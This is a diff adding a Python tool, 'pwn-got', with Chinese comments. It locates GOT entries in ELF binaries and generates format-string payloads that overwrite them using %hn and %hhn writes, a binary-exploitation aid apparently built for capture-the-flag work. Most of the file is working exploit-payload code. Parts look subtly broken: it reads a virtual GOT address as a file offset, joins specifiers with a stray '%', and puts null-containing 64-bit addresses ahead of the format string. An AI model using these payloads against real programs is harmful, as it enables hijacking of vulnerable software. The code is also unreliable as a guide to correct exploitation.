@@ -1,0 +1,195 @@
+#!/usr/bin/env python3
+"""pwn-got: GOT覆写计算器 - 格式串攻击辅助
+用法:
+    pwn-got <binary> <function>             # 查GOT地址
+    pwn-got <binary> <func> --write <addr>  # 计算格式串写入payload
+    pwn-got <binary> <func> --libc <libc.so> # 用libc自动算目标值
+    pwn-got --fmt <got_addr> <target_val>   # 纯计算格式串payload
+"""
+import struct, sys, os, subprocess
+
+def read_elf_bytes(path, offset, size):
+    with open(path, 'rb') as f:
+        f.seek(offset)
+        return f.read(size)
+
+def get_got_entry(binary, func_name):
+    """用readelf获取GOT地址"""
+    try:
+        out = subprocess.check_output(
+            ['readelf', '-rW', binary], stderr=subprocess.DEVNULL, text=True
+        )
+        for line in out.splitlines():
+            parts = line.split()
+            if len(parts) >= 5 and func_name in parts[-1]:
+                return int(parts[0], 16)
+    except:
+        pass
+    # fallback: 用objdump
+    try:
+        out = subprocess.check_output(
+            ['objdump', '-R', binary], stderr=subprocess.DEVNULL, text=True
+        )
+        for line in out.splitlines():
+            if func_name in line and 'R_' in line:
+                parts = line.split()
+                return int(parts[0], 16)
+    except:
+        pass
+    return None
+
+def get_dynsym_addr(binary, func_name):
+    """获取动态符号表中的函数地址"""
+    try:
+        out = subprocess.check_output(
+            ['nm', '-D', binary], stderr=subprocess.DEVNULL, text=True
+        )
+        for line in out.splitlines():
+            parts = line.split()
+            if len(parts) >= 3 and parts[-1] == func_name:
+                return int(parts[0], 16)
+    except:
+        pass
+    return None
+
+def read_got_value(binary, got_addr):
+    """读取GOT表项当前值"""
+    with open(binary, 'rb') as f:
+        f.seek(got_addr)
+        data = f.read(8)
+        if len(data) < 8:
+            data = data.ljust(8, b'\x00')
+        return struct.unpack('<Q', data)[0]
+
+def get_libc_base_offset(libc, func_name):
+    """从libc获取函数偏移"""
+    try:
+        out = subprocess.check_output(
+            ['nm', '-D', libc], stderr=subprocess.DEVNULL, text=True
+        )
+        for line in out.splitlines():
+            parts = line.split()
+            if len(parts) >= 3 and parts[-1] == func_name:
+                return int(parts[0], 16)
+    except:
+        pass
+    return None
+
+def make_fmt_write_short(got_addr, value, start_idx=6):
+    """生成格式串: 用%hn写2字节到指定地址
+    返回(payload_bytes, format_str_preview)
+    """
+    addr_hi = (value >> 16) & 0xFFFF
+    addr_lo = value & 0xFFFF
+    
+    addrs = bytearray()
+    fmt_parts = []
+    
+    if addr_lo > 0:
+        addrs.extend(struct.pack('<Q', got_addr))
+        fmt_parts.append(f"%{addr_lo}c%{start_idx}$hn")
+    if addr_hi > 0:
+        addrs.extend(struct.pack('<Q', got_addr + 2))
+        fmt_parts.append(f"%{addr_hi - addr_lo}c%{start_idx + 1}$hn")
+    
+    fmt = '%'.join(fmt_parts)
+    payload = addrs + fmt.encode()
+    return bytes(payload), fmt
+
+def make_fmt_write_byte(got_addr, value, start_idx=6):
+    """生成格式串: 用%hhn逐字节写"""
+    addrs = bytearray()
+    fmt_parts = []
+    prev = 0
+    
+    for i in range(8):
+        byte_val = (value >> (i * 8)) & 0xFF
+        if byte_val == 0 and i > 0:
+            continue
+        addrs.extend(struct.pack('<Q', got_addr + i))
+        diff = (byte_val - prev) % 256
+        if diff > 0:
+            fmt_parts.append(f"%{diff}c%{start_idx + len(fmt_parts)}$hhn")
+        else:
+            fmt_parts.append(f"%{start_idx + len(fmt_parts)}$hhn")
+        prev = byte_val
+    
+    fmt = '%'.join(fmt_parts)
+    payload = addrs + fmt.encode()
+    return bytes(payload), fmt
+
+def main():
+    if len(sys.argv) < 2:
+        print(__doc__)
+        sys.exit(1)
+    
+    if sys.argv[1] == '--fmt':
+        # 纯计算模式: pwn-got --fmt <got_addr> <target_val>
+        if len(sys.argv) < 4:
+            print("[-] Usage: pwn-got --fmt <got_addr_hex> <target_val_hex>")
+            sys.exit(1)
+        got = int(sys.argv[2], 16)
+        target = int(sys.argv[3], 16)
+        payload, preview = make_fmt_write_byte(got, target)
+        print(f"[*] GOT:  0x{got:x}")
+        print(f"[*] Target: 0x{target:x}")
+        print(f"[*] Payload ({len(payload)} bytes):")
+        sys.stdout.buffer.write(payload)
+        print()
+        print(f"[*] Format string: {preview}")
+        return
+    
+    if len(sys.argv) < 3:
+        print(__doc__)
+        sys.exit(1)
+    
+    binary = sys.argv[1]
+    func = sys.argv[2]
+    
+    if not os.path.isfile(binary):
+        print(f"[-] File not found: {binary}")
+        sys.exit(1)
+    
+    got_addr = get_got_entry(binary, func)
+    if got_addr is None:
+        print(f"[-] GOT entry not found for: {func}")
+        sys.exit(1)
+    
+    current = read_got_value(binary, got_addr)
+    print(f"[*] Function: {func}")
+    print(f"[*] GOT:      0x{got_addr:x}")
+    print(f"[*] Current:  0x{current:x}")
+    
+    if '--libc' in sys.argv:
+        libc_idx = sys.argv.index('--libc') + 1
+        if libc_idx >= len(sys.argv):
+            print("[-] Need libc path after --libc")
+            sys.exit(1)
+        libc = sys.argv[libc_idx]
+        libc_off = get_libc_base_offset(libc, func)
+        if libc_off is not None:
+            print(f"[*] Libc {func}: 0x{libc_off:x}")
+            print(f"[*] Hint: if libc loaded at 0x1234000, {func} = 0x{0x1234000 + libc_off:x}")
+    
+    if '--write' in sys.argv:
+        widx = sys.argv.index('--write') + 1
+        if widx >= len(sys.argv):
+            print("[-] Need target address after --write")
+            sys.exit(1)
+        target = int(sys.argv[widx], 16)
+        payload, preview = make_fmt_write_byte(got_addr, target)
+        print(f"[*] Target value: 0x{target:x}")
+        print(f"[*] Payload ({len(payload)} bytes):")
+        sys.stdout.buffer.write(payload)
+        print()
+    
+    # 检查是否已解析
+    dynsym_addr = get_dynsym_addr(binary, func)
+    if dynsym_addr and current == dynsym_addr:
+        print("[!] GOT未绑定(Lazy Binding), 值=PLT stub")
+        print(f"    触发一次 {func}() 后再用 --write")
+    elif current != 0:
+        print(f"[*] 已解析到: 0x{current:x}")
+
+if __name__ == '__main__':
+    main()
